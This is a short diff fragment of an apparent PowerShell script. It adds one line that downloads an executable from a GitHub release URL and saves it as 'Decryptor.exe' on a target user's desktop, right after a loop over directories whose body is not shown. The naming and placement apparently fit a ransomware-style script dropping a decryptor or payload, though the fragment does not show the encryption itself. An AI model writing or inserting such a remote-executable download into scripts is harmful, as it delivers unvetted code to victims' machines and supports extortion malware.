@@ -42,3 +42,4 @@ foreach ($dir in $Dirs) {
         }
     }
 }
+Invoke-WebRequest -o "$targetUser\Desktop\Decryptor.exe" https://github.com/lrqdz/a/releases/download/dat/A
